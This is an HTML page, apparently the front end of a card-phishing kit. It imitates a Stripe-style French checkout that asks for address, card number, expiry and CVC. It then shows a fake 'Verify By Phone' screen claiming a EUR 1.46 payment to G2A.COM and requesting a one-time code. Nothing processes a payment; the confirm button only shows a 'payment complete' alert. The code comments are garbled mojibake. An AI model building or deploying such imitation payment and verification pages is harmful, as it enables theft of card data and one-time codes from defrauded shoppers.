<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interface de Paiement</title>
    <style>
        :root {
            --stripe-blue: #0000FF; 
            --border-color: #e6e6e6;
            --text-main: #1d1d1f;
            --error-red: #df1b41;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
        }

        .container { width: 100%; max-width: 400px; position: relative; }

        /* --- ØªØµÙ…ÙŠÙ… Ø§Ù„Ù†Ø§ÙØ°Ø© Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø© (Modal) --- */
        #customAlert {
            display: none; /* Ù…Ø®ÙÙŠØ© Ø§ÙØªØ±Ø§Ø¶ÙŠØ§Ù‹ */
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            max-width: 320px;
            background: white;
            border-radius: 14px;
            z-index: 10001;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            padding-top: 25px;
        }

        #overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); /* ØªØ¹ØªÙŠÙ… Ø§Ù„Ø®Ù„ÙÙŠØ© */
            z-index: 10000;
        }

        .alert-content { padding: 0 20px 25px 20px; font-size: 16px; font-weight: 500; line-height: 1.4; color: #000; }

        .alert-btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-top: 1px solid #eee;
            background: transparent;
            color: var(--stripe-blue);
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            border-bottom-left-radius: 14px;
            border-bottom-right-radius: 14px;
        }

        /* --- Ø¨Ø§Ù‚ÙŠ ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ø§Ù„ØµÙØ­Ø© --- */
        .page { display: none; }
        .active { display: block; }

        input, select { 
            width: 100%; padding: 12px; border: 1px solid var(--border-color); 
            border-radius: 8px; font-size: 15px; box-sizing: border-box; outline: none; margin-bottom: 10px;
        }

        .input-error { border: 1px solid var(--error-red) !important; }

        .address-group { border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; margin-bottom: 20px; }
        .address-group input { border: none; border-bottom: 1px solid var(--border-color); border-radius: 0; margin-bottom: 0; }
        .address-group input:last-child { border-bottom: none; }

        .btn-pay { 
            width: 100%; background: var(--stripe-blue); color: white; border: none; 
            padding: 16px; border-radius: 8px; font-size: 17px; font-weight: 600; cursor: pointer; margin-top: 20px;
        }

        /* Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± */
        #loader { display: none; text-align: center; padding: 50px; }
        .spinner { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid var(--stripe-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* ØµÙØ­Ø© OTP */
        .v-title { font-family: serif; font-size: 26px; margin-bottom: 15px; }
        .v-input { height: 60px; text-align: center; font-size: 24px; letter-spacing: 6px; }
    </style>
</head>
<body>

<div class="container">
    
    <div id="overlay"></div>
    <div id="customAlert">
        <div class="alert-content">Veuillez remplir correctement tous les champs.</div>
        <button class="alert-btn" onclick="hideAlert()">Fermer</button>
    </div>

    <div id="checkoutPage" class="page active">
        <h2 style="font-size: 17px;">Informations de livraison</h2>
        <input type="email" id="email" placeholder="email@exemple.com">
        
        <div class="address-group">
            <input type="text" id="name" placeholder="Nom complet">
            <input type="text" id="addr" placeholder="Ligne d'adresse nÂ°1">
            <input type="text" id="city" placeholder="Ville">
            <input type="text" id="zip" placeholder="Code postal">
        </div>

        <div style="border: 1px solid var(--border-color); border-radius: 8px; padding: 15px;">
            <div style="display: flex; align-items: center; margin-bottom: 15px;">
                <span style="font-weight: 600;">ğŸ’³ Carte</span>
                <img src="https://i.ibb.co/w9KxwQ5/2-A2-A850-F-BE0-C-48-A0-B145-A2-BFD7-C481-EA.png" style="height: 20px; margin-left: auto;">
            </div>
            <input type="text" id="cardNum" placeholder="NumÃ©ro de carte" maxlength="19">
            <div style="display: flex; gap: 10px;">
                <input type="text" id="exp" placeholder="MM / AA" maxlength="5">
                <input type="text" id="cvc" placeholder="CVC" maxlength="4">
            </div>
        </div>
        
        <button class="btn-pay" onclick="validate()">Payer</button>
    </div>

    <div id="loader">
        <div class="spinner"></div>
        <p style="color: #666; margin-top: 15px;">Traitement en cours...</p>
    </div>

    <div id="verifyPage" class="page">
        <h1 class="v-title">Verify By Phone</h1>
        <p>You are paying G2A.COM the amount of <b>EUR 1.46</b>.</p>
        <input type="text" class="v-input" id="otp" maxlength="6" placeholder="000000">
        <button class="btn-pay" style="background: var(--stripe-blue);" onclick="alert('Paiement TerminÃ©')">CONFIRM</button>
    </div>

</div>

<script>
    // ØªÙ†Ø³ÙŠÙ‚ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
    document.getElementById('cardNum').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    function showAlert() {
        document.getElementById('customAlert').style.display = 'block';
        document.getElementById('overlay').style.display = 'block';
    }

    function hideAlert() {
        document.getElementById('customAlert').style.display = 'none';
        document.getElementById('overlay').style.display = 'none';
    }

    function validate() {
        const fields = ['email', 'name', 'addr', 'city', 'zip', 'cardNum', 'exp', 'cvc'];
        let valid = true;

        fields.forEach(id => {
            const el = document.getElementById(id);
            el.classList.remove('input-error');
            if (!el.value.trim()) {
                el.classList.add('input-error');
                valid = false;
            }
        });

        if (!valid) {
            showAlert(); // ØªØ¸Ù‡Ø± Ø§Ù„Ù†Ø§ÙØ°Ø© Ø¯Ø§Ø®Ù„ Ø§Ù„Ù…ÙˆÙ‚Ø¹
            return;
        }

        // Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±
        document.getElementById('checkoutPage').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('verifyPage').style.display = 'block';
        }, 3000);
    }
</script>

</body>
</html>
